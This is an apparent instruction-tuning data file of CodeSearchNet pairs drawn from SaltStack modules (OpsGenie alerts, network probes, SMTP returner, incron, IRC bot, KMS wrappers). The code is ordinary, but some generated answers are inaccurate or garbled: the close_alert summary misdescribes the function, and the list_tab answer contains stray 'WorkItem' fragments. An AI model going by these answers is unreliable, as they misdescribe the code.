{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating an alert in OpsGenie.", "response": "def create_alert(name=None, api_key=None, reason=None, action_type=\"Create\"):\n    '''\n    Create an alert in OpsGenie. Example usage with Salt's requisites and other\n    global state arguments could be found above.\n\n    Required Parameters:\n\n    api_key\n        It's the API Key you've copied while adding integration in OpsGenie.\n\n    reason\n        It will be used as alert's default message in OpsGenie.\n\n    Optional Parameters:\n\n    name\n        It will be used as alert's alias. If you want to use the close\n        functionality you must provide name field for both states like\n        in above case.\n\n    action_type\n        OpsGenie supports the default values Create/Close for action_type.\n        You can customize this field with OpsGenie's custom actions for\n        other purposes like adding notes or acknowledging alerts.\n    '''\n\n    _, _, _, values = inspect.getargvalues(inspect.currentframe())\n    log.info(\"Arguments values: %s\", values)\n\n    ret = {\n        'result': '',\n        'name': '',\n        'changes': '',\n        'comment': ''\n    }\n\n    if api_key is None or reason is None:\n        raise salt.exceptions.SaltInvocationError(\n            'API Key or Reason cannot be None.')\n\n    if __opts__['test'] is True:\n        ret[\n            'comment'] = 'Test: {0} alert request will be processed ' \\\n                         'using the API Key=\"{1}\".'.format(action_type, api_key)\n\n        # Return ``None`` when running with ``test=true``.\n        ret['result'] = None\n\n        return ret\n\n    response_status_code, response_text = __salt__['opsgenie.post_data'](\n        api_key=api_key,\n        name=name,\n        reason=reason,\n        action_type=action_type\n    )\n\n    if 200 <= response_status_code < 300:\n        log.info(\n            \"POST Request has succeeded with message: %s status code: %s\",\n            response_text, response_status_code)\n        ret[\n            'comment'] = 'Test: {0} alert request will be processed' \\\n                         ' using the API Key=\"{1}\".'.format(\n            action_type,\n            api_key)\n        ret['result'] = True\n    else:\n        log.error(\n            \"POST Request has failed with error: %s status code: %s\",\n            response_text, response_status_code)\n        ret['result'] = False\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef close_alert(name=None, api_key=None, reason=\"Conditions are met.\",\n                action_type=\"Close\"):\n    '''\n    Close an alert in OpsGenie. It's a wrapper function for create_alert.\n    Example usage with Salt's requisites and other global state arguments\n    could be found above.\n\n    Required Parameters:\n\n    name\n        It will be used as alert's alias. If you want to use the close\n        functionality you must provide name field for both states like\n        in above case.\n\n    Optional Parameters:\n\n    api_key\n        It's the API Key you've copied while adding integration in OpsGenie.\n\n    reason\n        It will be used as alert's default message in OpsGenie.\n\n    action_type\n        OpsGenie supports the default values Create/Close for action_type.\n        You can customize this field with OpsGenie's custom actions for\n        other purposes like adding notes or acknowledging alerts.\n    '''\n    if name is None:\n        raise salt.exceptions.SaltInvocationError(\n            'Name cannot be None.')\n\n    return create_alert(name, api_key, reason, action_type)", "response": "This function closes an alert in OpsGenie. It returns a new alert with the given name and API Key."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nexpand the probes dictionary with different levels of default values.", "response": "def _expand_probes(probes, defaults):\n\n    '''\n    Updates the probes dictionary with different levels of default values.\n    '''\n\n    expected_probes = {}\n\n    for probe_name, probe_test in six.iteritems(probes):\n        if probe_name not in expected_probes.keys():\n            expected_probes[probe_name] = {}\n        probe_defaults = probe_test.pop('defaults', {})\n        for test_name, test_details in six.iteritems(probe_test):\n            test_defaults = test_details.pop('defaults', {})\n            expected_test_details = deepcopy(defaults)  # copy first the general defaults\n            expected_test_details.update(probe_defaults)  # update with more specific defaults if any\n            expected_test_details.update(test_defaults)  # update with the most specific defaults if possible\n            expected_test_details.update(test_details)  # update with the actual config of the test\n            if test_name not in expected_probes[probe_name].keys():\n                expected_probes[probe_name][test_name] = expected_test_details\n\n    return expected_probes"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncleans up the probes dictionary.", "response": "def _clean_probes(probes):\n\n    '''\n    Will remove empty and useless values from the probes dictionary.\n    '''\n\n    probes = _ordered_dict_to_dict(probes)  # make sure we are working only with dict-type\n    probes_copy = deepcopy(probes)\n    for probe_name, probe_tests in six.iteritems(probes_copy):\n        if not probe_tests:\n            probes.pop(probe_name)\n            continue\n        for test_name, test_params in six.iteritems(probe_tests):\n            if not test_params:\n                probes[probe_name].pop(test_name)\n            if not probes.get(probe_name):\n                probes.pop(probe_name)\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncompare the probes on the device with the expected probes on the device and returns the differences.", "response": "def _compare_probes(configured_probes, expected_probes):\n\n    '''\n    Compares configured probes on the device with the expected configuration and returns the differences.\n    '''\n\n    new_probes = {}\n    update_probes = {}\n    remove_probes = {}\n\n    # noth configured => configure with expected probes\n    if not configured_probes:\n        return {\n            'add': expected_probes\n        }\n\n    # noting expected => remove everything\n    if not expected_probes:\n        return {\n            'remove': configured_probes\n        }\n\n    configured_probes_keys_set = set(configured_probes.keys())\n    expected_probes_keys_set = set(expected_probes.keys())\n    new_probes_keys_set = expected_probes_keys_set - configured_probes_keys_set\n    remove_probes_keys_set = configured_probes_keys_set - expected_probes_keys_set\n\n    # new probes\n    for probe_name in new_probes_keys_set:\n        new_probes[probe_name] = expected_probes.pop(probe_name)\n\n    # old probes, to be removed\n    for probe_name in remove_probes_keys_set:\n        remove_probes[probe_name] = configured_probes.pop(probe_name)\n\n    # common probes\n    for probe_name, probe_tests in six.iteritems(expected_probes):\n        configured_probe_tests = configured_probes.get(probe_name, {})\n        configured_tests_keys_set = set(configured_probe_tests.keys())\n        expected_tests_keys_set = set(probe_tests.keys())\n        new_tests_keys_set = expected_tests_keys_set - configured_tests_keys_set\n        remove_tests_keys_set = configured_tests_keys_set - expected_tests_keys_set\n\n        # new tests for common probes\n        for test_name in new_tests_keys_set:\n            if probe_name not in new_probes.keys():\n                new_probes[probe_name] = {}\n            new_probes[probe_name].update({\n                test_name: probe_tests.pop(test_name)\n            })\n        # old tests for common probes\n        for test_name in remove_tests_keys_set:\n            if probe_name not in remove_probes.keys():\n                remove_probes[probe_name] = {}\n            remove_probes[probe_name].update({\n                test_name: configured_probe_tests.pop(test_name)\n            })\n        # common tests for common probes\n        for test_name, test_params in six.iteritems(probe_tests):\n            configured_test_params = configured_probe_tests.get(test_name, {})\n            # if test params are different, probe goes to update probes dict!\n            if test_params != configured_test_params:\n                if probe_name not in update_probes.keys():\n                    update_probes[probe_name] = {}\n                update_probes[probe_name].update({\n                    test_name: test_params\n                })\n\n    return {\n        'add': new_probes,\n        'update': update_probes,\n        'remove': remove_probes\n    }"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nensures the networks device is configured as specified in the state SLS file. Probes not specified will be removed, while probes not confiured as expected will trigger config updates. :param probes: Defines the probes as expected to be configured on the device. In order to ease the configuration and avoid repeating the same parameters for each probe, the next parameter (defaults) can be used, providing common characteristics. :param defaults: Specifies common parameters for the probes. SLS Example: .. code-block:: yaml rpmprobes: probes.managed: - probes: probe_name1: probe1_test1: source: 192.168.0.2 target: 192.168.0.1 probe1_test2: target: 172.17.17.1 probe1_test3: target: 8.8.8.8 probe_type: http-ping probe_name2: probe2_test1: test_interval: 100 - defaults: target: 10.10.10.10 probe_count: 15 test_interval: 3 probe_type: icmp-ping In the probes configuration, the only mandatory attribute is *target* (specified either in probes configuration, either in the defaults dictionary). All the other parameters will use the operating system defaults, if not provided: - ``source`` - Specifies the source IP Address to be used during the tests. If not specified will use the IP Address of the logical interface loopback0. - ``target`` - Destination IP Address. - ``probe_count`` - Total number of probes per test (1..15). System defaults: 1 on both JunOS & Cisco. - ``probe_interval`` - Delay between tests (0..86400 seconds). System defaults: 3 on JunOS, 5 on Cisco. - ``probe_type`` - Probe request type. Available options: - icmp-ping - tcp-ping - udp-ping Using the example configuration above, after running the state, on the device will be configured 4 probes, with the following properties: .. code-block:: yaml probe_name1: probe1_test1: source: 192.168.0.2 target: 192.168.0.1 probe_count: 15 test_interval: 3 probe_type: icmp-ping probe1_test2: target: 172.17.17.1 probe_count: 15 test_interval: 3 probe_type: icmp-ping probe1_test3: target: 8.8.8.8 probe_count: 15 test_interval: 3 probe_type: http-ping probe_name2: probe2_test1: target: 10.10.10.10 probe_count: 15 test_interval: 3 probe_type: icmp-ping", "response": "def managed(name, probes, defaults=None):\n\n    '''\n    Ensure the networks device is configured as specified in the state SLS file.\n    Probes not specified will be removed, while probes not confiured as expected will trigger config updates.\n\n    :param probes: Defines the probes as expected to be configured on the\n        device.  In order to ease the configuration and avoid repeating the\n        same parameters for each probe, the next parameter (defaults) can be\n        used, providing common characteristics.\n\n    :param defaults: Specifies common parameters for the probes.\n\n    SLS Example:\n\n    .. code-block:: yaml\n\n        rpmprobes:\n            probes.managed:\n                - probes:\n                    probe_name1:\n                        probe1_test1:\n                            source: 192.168.0.2\n                            target: 192.168.0.1\n                        probe1_test2:\n                            target: 172.17.17.1\n                        probe1_test3:\n                            target: 8.8.8.8\n                            probe_type: http-ping\n                    probe_name2:\n                        probe2_test1:\n                            test_interval: 100\n                - defaults:\n                    target: 10.10.10.10\n                    probe_count: 15\n                    test_interval: 3\n                    probe_type: icmp-ping\n\n    In the probes configuration, the only mandatory attribute is *target*\n    (specified either in probes configuration, either in the defaults\n    dictionary).  All the other parameters will use the operating system\n    defaults, if not provided:\n\n    - ``source`` - Specifies the source IP Address to be used during the tests.  If\n      not specified will use the IP Address of the logical interface loopback0.\n\n    - ``target`` - Destination IP Address.\n    - ``probe_count`` - Total number of probes per test (1..15). System\n      defaults: 1 on both JunOS & Cisco.\n    - ``probe_interval`` - Delay between tests (0..86400 seconds). System\n      defaults: 3 on JunOS, 5 on Cisco.\n    - ``probe_type`` - Probe request type. Available options:\n\n      - icmp-ping\n      - tcp-ping\n      - udp-ping\n\n    Using the example configuration above, after running the state, on the device will be configured 4 probes,\n    with the following properties:\n\n    .. code-block:: yaml\n\n        probe_name1:\n            probe1_test1:\n                source: 192.168.0.2\n                target: 192.168.0.1\n                probe_count: 15\n                test_interval: 3\n                probe_type: icmp-ping\n            probe1_test2:\n                target: 172.17.17.1\n                probe_count: 15\n                test_interval: 3\n                probe_type: icmp-ping\n            probe1_test3:\n                target: 8.8.8.8\n                probe_count: 15\n                test_interval: 3\n                probe_type: http-ping\n        probe_name2:\n            probe2_test1:\n                target: 10.10.10.10\n                probe_count: 15\n                test_interval: 3\n                probe_type: icmp-ping\n    '''\n\n    ret = _default_ret(name)\n\n    result = True\n    comment = ''\n\n    rpm_probes_config = _retrieve_rpm_probes()  # retrieves the RPM config from the device\n    if not rpm_probes_config.get('result'):\n        ret.update({\n            'result': False,\n            'comment': 'Cannot retrieve configurtion of the probes from the device: {reason}'.format(\n                reason=rpm_probes_config.get('comment')\n            )\n        })\n        return ret\n\n    # build expect probes config dictionary\n    # using default values\n    configured_probes = rpm_probes_config.get('out', {})\n    if not isinstance(defaults, dict):\n        defaults = {}\n    expected_probes = _expand_probes(probes, defaults)\n\n    _clean_probes(configured_probes)  # let's remove the unnecessary data from the configured probes\n    _clean_probes(expected_probes)  # also from the expected data\n\n    # ----- Compare expected config with the existing config ---------------------------------------------------------->\n\n    diff = _compare_probes(configured_probes, expected_probes)  # compute the diff\n\n    # <---- Compare expected config with the existing config -----------------------------------------------------------\n\n    # ----- Call set_probes and delete_probes as needed --------------------------------------------------------------->\n\n    add_probes = diff.get('add')\n    update_probes = diff.get('update')\n    remove_probes = diff.get('remove')\n\n    changes = {\n        'added': _ordered_dict_to_dict(add_probes),\n        'updated': _ordered_dict_to_dict(update_probes),\n        'removed': _ordered_dict_to_dict(remove_probes)\n    }\n\n    ret.update({\n        'changes': changes\n    })\n\n    if __opts__['test'] is True:\n        ret.update({\n            'comment': 'Testing mode: configuration was not changed!',\n            'result': None\n        })\n        return ret\n\n    config_change_expected = False  # to check if something changed and a commit would be needed\n\n    if add_probes:\n        added = _set_rpm_probes(add_probes)\n        if added.get('result'):\n            config_change_expected = True\n        else:\n            result = False\n            comment += 'Cannot define new probes: {reason}\\n'.format(\n                reason=added.get('comment')\n            )\n\n    if update_probes:\n        updated = _set_rpm_probes(update_probes)\n        if updated.get('result'):\n            config_change_expected = True\n        else:\n            result = False\n            comment += 'Cannot update probes: {reason}\\n'.format(\n                reason=updated.get('comment')\n            )\n\n    if remove_probes:\n        removed = _delete_rpm_probes(remove_probes)\n        if removed.get('result'):\n            config_change_expected = True\n        else:\n            result = False\n            comment += 'Cannot remove probes! {reason}\\n'.format(\n                reason=removed.get('comment')\n            )\n\n    # <---- Call set_probes and delete_probes as needed ----------------------------------------------------------------\n\n    # ----- Try to save changes --------------------------------------------------------------------------------------->\n\n    if config_change_expected:\n        # if any changes expected, try to commit\n        result, comment = __salt__['net.config_control']()\n\n    # <---- Try to save changes ----------------------------------------------------------------------------------------\n\n    # ----- Try to schedule the probes -------------------------------------------------------------------------------->\n\n    add_scheduled = _schedule_probes(add_probes)\n    if add_scheduled.get('result'):\n        # if able to load the template to schedule the probes, try to commit the scheduling data\n        # (yes, a second commit is needed)\n        # on devices such as Juniper, RPM probes do not need to be scheduled\n        # therefore the template is empty and won't try to commit empty changes\n        result, comment = __salt__['net.config_control']()\n\n    if config_change_expected:\n        if result and comment == '':  # if any changes and was able to apply them\n            comment = 'Probes updated successfully!'\n\n    ret.update({\n        'result': result,\n        'comment': comment\n    })\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsends an email with the data", "response": "def returner(ret):\n    '''\n    Send an email with the data\n    '''\n\n    _options = _get_options(ret)\n    from_addr = _options.get('from')\n    to_addrs = _options.get('to').split(',')\n    host = _options.get('host')\n    port = _options.get('port')\n    user = _options.get('username')\n    passwd = _options.get('password')\n    subject = _options.get('subject') or 'Email from Salt'\n    gpgowner = _options.get('gpgowner')\n    fields = _options.get('fields').split(',') if 'fields' in _options else []\n    smtp_tls = _options.get('tls')\n\n    renderer = _options.get('renderer') or 'jinja'\n    rend = salt.loader.render(__opts__, {})\n    blacklist = __opts__.get('renderer_blacklist')\n    whitelist = __opts__.get('renderer_whitelist')\n\n    if not port:\n        port = 25\n    log.debug('SMTP port has been set to %s', port)\n\n    for field in fields:\n        if field in ret:\n            subject += ' {0}'.format(ret[field])\n    subject = compile_template(':string:',\n                               rend,\n                               renderer,\n                               blacklist,\n                               whitelist,\n                               input_data=subject,\n                               **ret)\n    if isinstance(subject, six.moves.StringIO):\n        subject = subject.read()\n    log.debug(\"smtp_return: Subject is '%s'\", subject)\n\n    template = _options.get('template')\n    if template:\n        content = compile_template(template, rend, renderer, blacklist, whitelist, **ret)\n    else:\n        template = ('id: {{id}}\\r\\n'\n                    'function: {{fun}}\\r\\n'\n                    'function args: {{fun_args}}\\r\\n'\n                    'jid: {{jid}}\\r\\n'\n                    'return: {{return}}\\r\\n')\n        content = compile_template(':string:',\n                                   rend,\n                                   renderer,\n                                   blacklist,\n                                   whitelist,\n                                   input_data=template,\n                                   **ret)\n\n    if gpgowner:\n        if HAS_GNUPG:\n            gpg = gnupg.GPG(gnupghome=os.path.expanduser('~{0}/.gnupg'.format(gpgowner)),\n                            options=['--trust-model always'])\n            encrypted_data = gpg.encrypt(content, to_addrs)\n            if encrypted_data.ok:\n                log.debug('smtp_return: Encryption successful')\n                content = six.text_type(encrypted_data)\n            else:\n                log.error('smtp_return: Encryption failed, only an error message will be sent')\n                content = 'Encryption failed, the return data was not sent.\\r\\n\\r\\n{0}\\r\\n{1}'.format(\n                    encrypted_data.status, encrypted_data.stderr)\n        else:\n            log.error(\"gnupg python module is required in order to user gpgowner in smtp returner ; ignoring gpgowner configuration for now\")\n    if isinstance(content, six.moves.StringIO):\n        content = content.read()\n\n    message = ('From: {0}\\r\\n'\n               'To: {1}\\r\\n'\n               'Date: {2}\\r\\n'\n               'Subject: {3}\\r\\n'\n               '\\r\\n'\n               '{4}').format(from_addr,\n                             ', '.join(to_addrs),\n                             formatdate(localtime=True),\n                             subject,\n                             content)\n\n    log.debug('smtp_return: Connecting to the server...')\n    server = smtplib.SMTP(host, int(port))\n    if smtp_tls is True:\n        server.starttls()\n        log.debug('smtp_return: TLS enabled')\n    if user and passwd:\n        server.login(user, passwd)\n        log.debug('smtp_return: Authenticated')\n    # enable logging SMTP session after the login credentials were passed\n    server.set_debuglevel(1)\n    server.sendmail(from_addr, to_addrs, message)\n    log.debug('smtp_return: Message sent.')\n    server.quit()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef event_return(events):\n    '''\n    Return event data via SMTP\n    '''\n\n    for event in events:\n        ret = event.get('data', False)\n\n        if ret:\n            returner(ret)", "response": "Return event data via SMTP\n   "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ntaking a tab list structure and renders it to a list for applying it to a file", "response": "def _render_tab(lst):\n    '''\n    Takes a tab list structure and renders it to a list for applying it to\n    a file\n    '''\n    ret = []\n    for pre in lst['pre']:\n        ret.append('{0}\\n'.format(pre))\n    for cron in lst['crons']:\n        ret.append('{0} {1} {2} {3}\\n'.format(cron['path'],\n                                                      cron['mask'],\n                                                      cron['cmd'],\n                                                      TAG\n                                                      )\n                   )\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef write_incron_file(user, path):\n    '''\n    Writes the contents of a file to a user's incrontab\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' incron.write_incron_file root /tmp/new_incron\n    '''\n    return __salt__['cmd.retcode'](_get_incron_cmdstr(path), runas=user, python_shell=False) == 0", "response": "Writes the contents of a file to a user s incrontab\n    CLI Example"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nwrites the contents of a file to a user s incrontab and returns error message on error", "response": "def write_incron_file_verbose(user, path):\n    '''\n    Writes the contents of a file to a user's incrontab and return error message on error\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' incron.write_incron_file_verbose root /tmp/new_incron\n    '''\n    return __salt__['cmd.run_all'](_get_incron_cmdstr(path), runas=user, python_shell=False)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nwrite a list of lines to a user s incrontab and returns the path to the new incrontab", "response": "def _write_incron_lines(user, lines):\n    '''\n    Takes a list of lines to be committed to a user's incrontab and writes it\n    '''\n    if user == 'system':\n        ret = {}\n        ret['retcode'] = _write_file(_INCRON_SYSTEM_TAB, 'salt', ''.join(lines))\n        return ret\n    else:\n        path = salt.utils.files.mkstemp()\n        with salt.utils.files.fopen(path, 'wb') as fp_:\n            fp_.writelines(salt.utils.data.encode(lines))\n        if __grains__['os_family'] == 'Solaris' and user != \"root\":\n            __salt__['cmd.run']('chown {0} {1}'.format(user, path), python_shell=False)\n        ret = __salt__['cmd.run_all'](_get_incron_cmdstr(path), runas=user, python_shell=False)\n        os.remove(path)\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _write_file(folder, filename, data):\n    '''\n    Writes a file to disk\n    '''\n    path = os.path.join(folder, filename)\n    if not os.path.exists(folder):\n        msg = '{0} cannot be written. {1} does not exist'.format(filename, folder)\n        log.error(msg)\n        raise AttributeError(six.text_type(msg))\n    with salt.utils.files.fopen(path, 'w') as fp_:\n        fp_.write(salt.utils.stringutils.to_str(data))\n\n    return 0", "response": "Writes a file to disk\n   "}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _read_file(folder, filename):\n    '''\n    Reads and returns the contents of a file\n    '''\n    path = os.path.join(folder, filename)\n    try:\n        with salt.utils.files.fopen(path, 'rb') as contents:\n            return salt.utils.data.decode(contents.readlines())\n    except (OSError, IOError):\n        return ''", "response": "Reads and returns the contents of a file\n   "}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nreturning the contents of the user s incrontab CLI Example : incrontab", "response": "def raw_incron(user):\n    '''\n    Return the contents of the user's incrontab\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' incron.raw_incron root\n    '''\n    if __grains__['os_family'] == 'Solaris':\n        cmd = 'incrontab -l {0}'.format(user)\n    else:\n        cmd = 'incrontab -l -u {0}'.format(user)\n    return __salt__['cmd.run_stdout'](cmd, rstrip=False, runas=user, python_shell=False)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef list_tab(user):\n    '''\n    Return the contents of the specified user's incrontab\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' incron.list_tab root\n    '''\n    if user == 'system':\n        data = raw_system_incron()\n    else:\n        data = raw_incron(user)\n        log.debug('incron user data %s', data)\n    ret = {'crons': [],\n           'pre': []\n           }\n    flag = False\n    comment = None\n    tag = '# Line managed by Salt, do not edit'\n    for line in data.splitlines():\n        if line.endswith(tag):\n            if len(line.split()) > 3:\n                # Appears to be a standard incron line\n                comps = line.split()\n                path = comps[0]\n                mask = comps[1]\n                (cmd, comment) = ' '.join(comps[2:]).split(' # ')\n\n                dat = {'path': path,\n                       'mask': mask,\n                       'cmd': cmd,\n                       'comment': comment}\n                ret['crons'].append(dat)\n                comment = None\n        else:\n            ret['pre'].append(line)\n    return ret", "response": "Return the contents of the specified user s incrontab\n    CLI Example : bash\nWorkItem salt '*' incrontab\nWorkItem. list_tab user"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef set_job(user, path, mask, cmd):\n    '''\n    Sets an incron job up for a specified user.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' incron.set_job root '/root' 'IN_MODIFY' 'echo \"$$ $@ $# $% $&\"'\n    '''\n    # Scrub the types\n    mask = six.text_type(mask).upper()\n\n    # Check for valid mask types\n    for item in mask.split(','):\n        if item not in _MASK_TYPES:\n            return 'Invalid mask type: {0}' . format(item)\n\n    updated = False\n    arg_mask = mask.split(',')\n    arg_mask.sort()\n    lst = list_tab(user)\n\n    updated_crons = []\n    # Look for existing incrons that have cmd, path and at least one of the MASKS\n    # remove and replace with the one we're passed\n    for item, cron in enumerate(lst['crons']):\n        if path == cron['path']:\n            if cron['cmd'] == cmd:\n                cron_mask = cron['mask'].split(',')\n                cron_mask.sort()\n                if cron_mask == arg_mask:\n                    return 'present'\n\n                if any([x in cron_mask for x in arg_mask]):\n                    updated = True\n                else:\n                    updated_crons.append(cron)\n            else:\n                updated_crons.append(cron)\n        else:\n            updated_crons.append(cron)\n\n    cron = {'cmd': cmd, 'path': path, 'mask': mask}\n    updated_crons.append(cron)\n\n    lst['crons'] = updated_crons\n    comdat = _write_incron_lines(user, _render_tab(lst))\n    if comdat['retcode']:\n        # Failed to commit, return the error\n        return comdat['stderr']\n\n    if updated:\n        return 'updated'\n    else:\n        return 'new'", "response": "Sets an incron job up for a user."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef rm_job(user,\n           path,\n           mask,\n           cmd):\n    '''\n    Remove a incron job for a specified user. If any of the day/time params are\n    specified, the job will only be removed if the specified params match.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' incron.rm_job root /path\n    '''\n\n    # Scrub the types\n    mask = six.text_type(mask).upper()\n\n    # Check for valid mask types\n    for item in mask.split(','):\n        if item not in _MASK_TYPES:\n            return 'Invalid mask type: {0}' . format(item)\n\n    lst = list_tab(user)\n    ret = 'absent'\n    rm_ = None\n    for ind in range(len(lst['crons'])):\n        if rm_ is not None:\n            break\n        if path == lst['crons'][ind]['path']:\n            if cmd == lst['crons'][ind]['cmd']:\n                if mask == lst['crons'][ind]['mask']:\n                    rm_ = ind\n    if rm_ is not None:\n        lst['crons'].pop(rm_)\n        ret = 'removed'\n    comdat = _write_incron_lines(user, _render_tab(lst))\n    if comdat['retcode']:\n        # Failed to commit, return the error\n        return comdat['stderr']\n\n    return ret", "response": "Remove a incron job for a specified user."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nstarting a new bot with the given parameters.", "response": "def start(nick, host, port=6667, username=None, password=None, channels=None, use_ssl=False, use_sasl=False,\n          char='!', allow_hosts=False, allow_nicks=False, disable_query=True):\n    '''\n    IRC Bot for interacting with salt.\n\n    nick\n        Nickname of the connected Bot.\n\n    host\n        irc server (example - chat.freenode.net).\n\n    port\n        irc port.  Default: 6667\n\n    password\n        password for authenticating.  If not provided, user will not authenticate on the irc server.\n\n    channels\n        channels to join.\n\n    use_ssl\n        connect to server using ssl. Default: False\n\n    use_sasl\n        authenticate using sasl, instead of messaging NickServ. Default: False\n\n        .. note:: This will allow the bot user to be fully authenticated before joining any channels\n\n    char\n        command character to look for. Default: !\n\n    allow_hosts\n        hostmasks allowed to use commands on the bot.  Default: False\n        True to allow all\n        False to allow none\n        List of regexes to allow matching\n\n    allow_nicks\n        Nicks that are allowed to use commands on the bot.  Default: False\n        True to allow all\n        False to allow none\n        List of regexes to allow matching\n\n    disable_query\n        Disable commands from being sent through private queries.  Require they be sent to a channel, so that all\n        communication can be controlled by access to the channel. Default: True\n\n    .. warning:: Unauthenticated Access to event stream\n\n        This engine sends events calls to the event stream without authenticating them in salt.  Authentication will\n        need to be configured and enforced on the irc server or enforced in the irc channel.  The engine only accepts\n        commands from channels, so non authenticated users could be banned or quieted in the channel.\n\n        /mode +q $~a  # quiet all users who are not authenticated\n        /mode +r      # do not allow unauthenticated users into the channel\n\n        It would also be possible to add a password to the irc channel, or only allow invited users to join.\n    '''\n    client = IRCClient(nick, host, port, username, password, channels or [], use_ssl, use_sasl, char,\n                       allow_hosts, allow_nicks, disable_query)\n    client.io_loop.start()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef check_mod_enabled(mod):\n    '''\n    Checks to see if the specific apache mod is enabled.\n\n    This will only be functional on operating systems that support\n    `a2enmod -l` to list the enabled mods.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' apache.check_mod_enabled status\n    '''\n    if mod.endswith('.load') or mod.endswith('.conf'):\n        mod_name = mod[:-5]\n    else:\n        mod_name = mod\n\n    cmd = 'a2enmod -l'\n    try:\n        active_mods = __salt__['cmd.run'](cmd, python_shell=False).split(' ')\n    except Exception as e:\n        return e\n\n    return mod_name in active_mods", "response": "Checks to see if apache mod is enabled."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating an alias for a key.", "response": "def create_alias(alias_name, target_key_id, region=None, key=None, keyid=None,\n                 profile=None):\n    '''\n    Create a display name for a key.\n\n    CLI example::\n\n        salt myminion boto_kms.create_alias 'alias/mykey' key_id\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    r = {}\n    try:\n        conn.create_alias(alias_name, target_key_id)\n        r['result'] = True\n    except boto.exception.BotoServerError as e:\n        r['result'] = False\n        r['error'] = __utils__['boto.get_error'](e)\n    return r"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a grant for a key.", "response": "def create_grant(key_id, grantee_principal, retiring_principal=None,\n                 operations=None, constraints=None, grant_tokens=None,\n                 region=None, key=None, keyid=None, profile=None):\n    '''\n    Adds a grant to a key to specify who can access the key and under what\n    conditions.\n\n    CLI example::\n\n        salt myminion boto_kms.create_grant 'alias/mykey' 'arn:aws:iam::1111111:/role/myrole' operations='[\"Encrypt\",\"Decrypt\"]'\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    if key_id.startswith('alias/'):\n        key_id = _get_key_id(key_id)\n    r = {}\n    try:\n        r['grant'] = conn.create_grant(\n            key_id,\n            grantee_principal,\n            retiring_principal=retiring_principal,\n            operations=operations,\n            constraints=constraints,\n            grant_tokens=grant_tokens\n        )\n    except boto.exception.BotoServerError as e:\n        r['error'] = __utils__['boto.get_error'](e)\n    return r"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create_key(policy=None, description=None, key_usage=None, region=None,\n               key=None, keyid=None, profile=None):\n    '''\n    Creates a master key.\n\n    CLI example::\n\n        salt myminion boto_kms.create_key '{\"Statement\":...}' \"My master key\"\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    r = {}\n    _policy = salt.serializers.json.serialize(policy)\n    try:\n        key_metadata = conn.create_key(\n            _policy,\n            description=description,\n            key_usage=key_usage\n        )\n        r['key_metadata'] = key_metadata['KeyMetadata']\n    except boto.exception.BotoServerError as e:\n        r['error'] = __utils__['boto.get_error'](e)\n    return r", "response": "Create a master key."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef decrypt(ciphertext_blob, encryption_context=None, grant_tokens=None,\n            region=None, key=None, keyid=None, profile=None):\n    '''\n    Decrypt ciphertext.\n\n    CLI example::\n\n        salt myminion boto_kms.decrypt encrypted_ciphertext\n    '''\n    conn = _get_conn(region=region, key=key, keyid=keyid, profile=profile)\n\n    r = {}\n    try:\n        plaintext = conn.decrypt(\n            ciphertext_blob,\n            encryption_context=encryption_context,\n            grant_tokens=grant_tokens\n        )\n        r['plaintext'] = plaintext['Plaintext']\n    except boto.exception.BotoServerError as e:\n        r['error'] = __utils__['boto.get_error'](e)\n    return r", "response": "Decrypt ciphertext.\n\n    CLI example::\n\n        salt myminion boto_kms.decrypt encrypted_ciphertext"}
